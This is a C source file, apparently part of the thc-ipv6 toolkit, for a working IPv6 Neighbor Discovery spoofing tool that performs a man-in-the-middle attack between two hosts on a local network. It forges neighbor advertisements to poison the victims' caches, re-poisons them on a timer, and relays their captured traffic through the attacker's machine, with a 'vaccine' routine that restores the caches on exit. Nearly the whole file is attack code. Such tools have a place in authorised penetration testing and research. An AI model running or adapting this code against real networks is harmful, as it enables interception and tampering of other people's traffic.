#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <netdb.h>
#include <pcap.h>
#include <thc-ipv6.h>
#include "host_scan.h"
#define SPOOFER_C_
#include "spoofer.h"
#undef   SPOOFER_C_

#define DEBUG 0
#define TIMER_TO_SPOOF 55       //in seconds, the normal cache is set to 60 seconds
#define ETH_HDR_LEN     14      // Extensão do cabeçalho Ethernet
#define IP6_HDR_LEN     40      // Extensão do cabeçalho IPv6
#define BUF_SIZE        16      // Extensão do Buffer de Envio
#define PKT_FLAGS       0xdeadbeef      // Flags de envio do pacote [ID|SEQ]


extern int thc_socket;
extern char *default_interface;
int pidRepeater1 = 0;          //process id to send the kill signal 
int pidInfector1 = 0;          //process id to send the kill signal 
int pidInfector2 = 0;          //process id to send the kill signal 
MArgs mArgs;
unsigned char *pkt = NULL, buf[24], mac[7] = "";
unsigned char fakemac[7] = "\x00\x0c\x29\x01\x75\xfe" /*"\x00\xfa\b5\x00\x44\xd5", */ ;
unsigned char targetmac[7] = /*"\x00\x0c\x29\xf2\x44\xd5"; */ "\x00\x0c\x29\x0e\x09\x7a";
unsigned char *mac6 = mac, *src6, *target6, *oldrouter6, *newrouter6;
int pkt_len = 0;
thc_ipv6_hdr *ipv6;
char *interface;
int rawmode = 0;
int mychecksum;
unsigned char *nodeAIp, *nodeAMac, *nodeBIp, *nodeBMac, *ownMac;

int createRepeater(unsigned char *nodAIp, unsigned char *nodAMac, unsigned char *nodBIp, unsigned char *nodBMac);

unsigned char *resolveMAC(unsigned char *maco) {
  unsigned char *mac = malloc(6);

  sscanf(maco, "%x:%x:%x:%x:%x:%x", (unsigned int *) &mac[0], (unsigned int *) &mac[1], (unsigned int *) &mac[2], (unsigned int *) &mac[3], (unsigned int *) &mac[4],
         (unsigned int *) &mac[5]);
  return mac;
}

/**
 * Own packet sending function
 * */

int daemon6_send_pkt(char *interface, unsigned char *pkt, int *pkt_len) {
  struct sockaddr sa;

  thc_ipv6_hdr *hdr = (thc_ipv6_hdr *) pkt;

  if (pkt == NULL || hdr->pkt == NULL || hdr->pkt_len < 1)
    return -1;

  if (interface == NULL)
    interface = default_interface;
  strcpy(sa.sa_data, interface);

  if (thc_socket < 0)
    thc_socket = thc_open_ipv6();

  return sendto(thc_socket, pkt, *pkt_len, /*hdr->pkt, hdr->pkt_len, */ 0, &sa, sizeof(sa));
}

/**
  Função que realiza o envio de um pacote Echo Request para na interface especificada para o endereço de multicast
  passado como parâmetro.
 */
int sendEchoRequest(char *interface,    // Interface inde se sendrá o pacote
                    unsigned char *multicast6,  // Enedereço de Multicast IPv6 [destino]
                    unsigned char *src6,        // Enedereço do host que send o pacote [IPv6]
                    unsigned char *router6,     // Roteador [NULL caso não necessite]
                    unsigned char **routers,     // Lista de Roteamento
                    unsigned char *buf, // Buffer contendo os dados a serem senddos
                    unsigned char *mac, // Endereço do destino  [MAC]
                    unsigned char *macsrc) {    //Endereco do host que send o pacote [MAC]     

  int pkt1_len = 0;             // Tamanho do pacote a ser senddo
  unsigned char *pkt1 = NULL;   // Pacote a ser montado e senddo
  thc_ipv6_hdr *hdr;            // Estrutura do header IPv6

  // cria o 1o pacote para o endereco de multicast
  if ((pkt1 = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt1_len, src6, multicast6, 0, 0, 0, 0, 0)) == NULL)
    return -1;

  // caso tenha sido setado uma rota e adicionado um header de rota
  if (router6 != NULL)
    if (thc_add_hdr_route(pkt1, &pkt1_len, routers, 1) < 0)
      return -1;

  // eh criado o pacote echo request
  if (thc_add_icmp6(pkt1, &pkt1_len, ICMP6_PINGREQUEST, 0, PKT_FLAGS, (unsigned char *) &buf, BUF_SIZE, 0) < 0)
    return -1;

  // aqui o pacote eh encapsulado
  if (thc_generate_pkt(interface, macsrc, mac, pkt1, &pkt1_len) < 0) {
    fprintf(stderr, "Error: Can not send packet, exiting ...\n");
    exit(-1);
  }
  // se for para uma rota send como fragmento ??
  if (router6 != NULL) {
    hdr = (thc_ipv6_hdr *) pkt1;
    thc_send_as_fragment6(interface,
                          src6,
                          multicast6,
                          NXT_ROUTE,
                          hdr->pkt + IP6_HDR_LEN + ETH_HDR_LEN,
                          hdr->pkt_len - IP6_HDR_LEN - ETH_HDR_LEN, hdr->pkt_len > 1448 ? 1448 : (((hdr->pkt_len - IP6_HDR_LEN - ETH_HDR_LEN) / 16) + 1) * 8);
  } else                        // senao send o pacote normalmente
    thc_send_pkt(interface, pkt1, &pkt1_len);
}


/**
 * This function sends the packets to poison the victim, it is the way to win the race condition, if the host`s ndp
 * cache is statefull
 * */

void sendPoison() {
  thc_neighboradv6(mArgs.interface, nodeBIp, nodeAIp, resolveMAC(mArgs.ownMac), nodeAMac, 0x60000000, nodeBIp);
  usleep(100);
  thc_neighboradv6(mArgs.interface, nodeBIp, nodeAIp, resolveMAC(mArgs.ownMac), nodeAMac, 0x60000000, nodeBIp);
  usleep(200);
  thc_neighboradv6(mArgs.interface, nodeBIp, nodeAIp, resolveMAC(mArgs.ownMac), nodeAMac, 0x60000000, nodeBIp);
  usleep(300);
  thc_neighboradv6(mArgs.interface, nodeBIp, nodeAIp, resolveMAC(mArgs.ownMac), nodeAMac, 0x60000000, nodeBIp);
  usleep(400);
  thc_neighboradv6(mArgs.interface, nodeBIp, nodeAIp, resolveMAC(mArgs.ownMac), nodeAMac, 0x60000000, nodeBIp);
}

/**
 * This function sends the packets to heal the victim, it is the way to clean the infection
 * 
 * */

void sendVaccine(unsigned char *ipA, unsigned char *ipB, unsigned char *macA, unsigned char *macB) {
  sendEchoRequest(mArgs.interface, ipA, ipB, NULL, NULL, NULL, macA, macB);
  thc_neighboradv6(mArgs.interface, ipB, ipA, macB, macA, 0x60000000, ipB);
  usleep(100);
  thc_neighboradv6(mArgs.interface, ipB, ipA, macB, macA, 0x60000000, ipB);
  usleep(200);
  thc_neighboradv6(mArgs.interface, ipB, ipA, macB, macA, 0x60000000, ipB);
  usleep(300);
  thc_neighboradv6(mArgs.interface, ipB, ipA, macB, macA, 0x60000000, ipB);
  usleep(400);
  thc_neighboradv6(mArgs.interface, ipB, ipA, macB, macA, 0x60000000, ipB);
}

void alarmed() {
  sendPoison();
  alarm(TIMER_TO_SPOOF);
}

int maintainInfection(unsigned char *nodAIp, unsigned char *nodAMac, unsigned char *nodBIp, unsigned char *nodBMac) {
  int pid = 0;

  if ((pid = fork()) == 0) {
    nodeAIp = thc_resolve6(nodAIp);
    nodeAMac = resolveMAC(nodAMac);
    nodeBIp = thc_resolve6(nodBIp);
    nodeBMac = resolveMAC(nodBMac);
    if (DEBUG)
      puts("Infectuous process!");
    signal(SIGALRM, alarmed);

    //sends an echo request in order to induce a neigh solicitation
    sendEchoRequest(mArgs.interface, nodeAIp, nodeBIp, NULL, NULL, NULL, nodeAMac, resolveMAC(mArgs.ownMac));
    alarmed();
    while (1) sleep(1);                  //to keep the process alive
    exit(0);                    // never reached
  }
  return pid;
}

void end() {
  printf("Healing - %d %d %d\n", pidInfector1, pidInfector2, pidRepeater1);
  kill(pidInfector1, SIGKILL);
  kill(pidInfector2, SIGKILL);
  kill(pidRepeater1, SIGKILL);
  sleep(20);
  printf("Healing\n");
  sendVaccine(thc_resolve6(mArgs.ipAddrVic1), thc_resolve6(mArgs.ipAddrVic2), resolveMAC(mArgs.macAddrVic1), resolveMAC(mArgs.macAddrVic2));
  sendVaccine(thc_resolve6(mArgs.ipAddrVic2), thc_resolve6(mArgs.ipAddrVic1), resolveMAC(mArgs.macAddrVic2), resolveMAC(mArgs.macAddrVic1));
  exit(0);
}

void spoofer(MArgs mArgss) {
  mArgs = mArgss;

  nodeAIp = thc_resolve6(mArgs.ipAddrVic1);
  nodeAMac = resolveMAC(mArgs.macAddrVic1);
  nodeBIp = thc_resolve6(mArgs.ipAddrVic2);
  nodeBMac = resolveMAC(mArgs.macAddrVic2);

  //Decides if it is a 1 side spoof or a 2 side spoof
  if (mArgs.twoVics) {
    pidInfector1 = maintainInfection(mArgs.ipAddrVic1, mArgs.macAddrVic1, mArgs.ipAddrVic2, mArgs.macAddrVic2);
    //maintain the spoofer to A side
    pidInfector2 = maintainInfection(mArgs.ipAddrVic2, mArgs.macAddrVic2, mArgs.ipAddrVic1, mArgs.macAddrVic1);
    //maintain the spoofer to B side
    sleep(1);
    pidRepeater1 = createRepeater(mArgs.ipAddrVic1, mArgs.macAddrVic1, mArgs.ipAddrVic2, mArgs.macAddrVic2);
    signal(SIGTERM, end);       //sets the function to be called when the program ends
    while (1);
  } else {
    puts("1");
  }
  puts("---");
}

void repeater(u_char * foo, const struct pcap_pkthdr *header, const unsigned char *data) {
  unsigned char *ipv6hdr = (unsigned char *) (data + 14);
  int pkt_len = header->caplen;
  unsigned char *pkt = NULL;

  int erro = 0;

  if (ipv6hdr[6] == NXT_ICMP6 && (ipv6hdr[40] == ICMP6_NEIGHBORSOL || ipv6hdr[40] == ICMP6_NEIGHBORADV)) {
    return;
  }

  if (memcmp(data, ownMac, 6)) {
    return;
  }

  pkt = malloc(header->caplen);
  memcpy(pkt, data, header->caplen);

  if (DEBUG)
    thc_dump_data(pkt, pkt_len, "CAPTURED PACKET:");

  if (memcmp(data + 6, nodeAMac, 6) == 0) {
    memcpy(pkt, nodeBMac, 6);   //changing the destination
  }
  if (memcmp(data + 6, nodeBMac, 6) == 0) {
    memcpy(pkt, nodeAMac, 6);   //changing the destination
  }

  memcpy(pkt + 6, ownMac, 6);   //changing the source

  if (DEBUG)
    printf(" < %d >\n", pkt_len);
  if (DEBUG)
    thc_dump_data(pkt, pkt_len, "SPOOFED PACKET:");

  clearerr(stderr);
  if ((erro = daemon6_send_pkt(interface, pkt, &pkt_len)) < 0)
    perror("No success");
  if (DEBUG)
    printf("errono = %d\n", erro);
}

int createRepeater(unsigned char *nodAIp, unsigned char *nodAMac, unsigned char *nodBIp, unsigned char *nodBMac) {
  ownMac = resolveMAC(mArgs.ownMac);

  if (DEBUG)
    thc_dump_data(ownMac, 6, "Own mac:");

  nodeAIp = thc_resolve6(nodAIp);
  nodeAMac = resolveMAC(nodAMac);
  nodeBIp = thc_resolve6(nodBIp);
  nodeBMac = resolveMAC(nodBMac);
  int pid = 0;
  char filter[256] = "ip6 and ( ( src ";

  strcat(filter, nodAIp);
  strcat(filter, " and dst ");
  strcat(filter, nodBIp);
  strcat(filter, " ) or ( src ");
  strcat(filter, nodBIp);
  strcat(filter, " and dst ");
  strcat(filter, nodAIp);
  strcat(filter, " ) )");
  if (DEBUG)
    printf("Filter : %s \n", filter);

  if ((pid = fork()) == 0) {
    thc_pcap_function(mArgs.interface, filter, (char *) repeater, 1, NULL);
    exit(0);
  }

  return pid;
}

int main(int argc, char *argv[]) {

  if (argc < 4) {
    printf("code by Fabricio Nogueira Buzeto and Carlos Botelho De Paula Filho\nCode based on thc-ipv6\n\n");
    printf("Syntax: %s interface target1 target2\n\n", argv[0]);
    printf("NDP spoof between target1 and target2 to perform a man-in-the-middle attack.\n");
    exit(-1);
  }

  memset((char*)&mArgs, 0, sizeof(mArgs));
  mArgs.interface = argv[1];
  mArgs.ipAddrVic1 = thc_resolve6(argv[2]);
  mArgs.macAddrVic1 = thc_get_mac(argv[1], NULL, mArgs.ipAddrVic1);
  mArgs.ownMac = thc_get_own_mac(argv[1]);
  mArgs.ownIp = thc_get_own_ipv6(argv[1], mArgs.ipAddrVic1, PREFER_LINK);
  mArgs.twoVics = 1;
  mArgs.ipAddrVic2 = thc_resolve6(argv[3]);
  mArgs.macAddrVic2 = thc_get_mac(argv[1], NULL, mArgs.ipAddrVic2);

  if (mArgs.ownIp == NULL) {
    fprintf(stderr, "ERROR: Invalid interface: %s\n", argv[1]);
    exit(-1);
  }
  if (mArgs.macAddrVic1 == NULL) {
    fprintf(stderr, "ERROR: Invalid target1: %s\n", argv[2]);
    exit(-1);
  }
  if (mArgs.macAddrVic2 == NULL) {
    fprintf(stderr, "ERROR: Invalid target2: %s\n", argv[3]);
    exit(-1);
  }
  
  spoofer(mArgs);
  
  printf("\nPress Control-C to end MITM spoofing...\n");
  while(1) sleep(1);
}
